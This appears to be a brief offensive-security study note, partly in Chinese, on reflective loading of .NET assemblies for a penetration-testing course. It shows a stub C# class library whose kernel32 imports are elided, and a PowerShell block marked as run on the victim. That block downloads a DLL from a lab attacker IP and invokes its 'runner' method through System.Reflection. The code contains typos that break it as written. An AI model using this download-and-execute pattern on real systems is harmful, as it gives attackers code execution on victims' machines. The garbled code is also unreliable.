## Reflective load

System.Reflection.Assembly 是.Net framework提供的一个访问metadata的帮助类 可以动态访问资源。

New Project - Class Library(.Net Framework)

```c#
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
	public class class1
	{
		[DllImport("kernel32.dll")]
		...
		...
		...
		
		public static void runner()	
	}
}

```

vicitim
```powershell
(New-Object Ststem.Net.WebClient).DownloadFile('http://192.168.119.12/Classlibraru1.dll','classlibrary1.dll')

$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\offsec\ClassLibrary1.dll")
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0,$null)

```

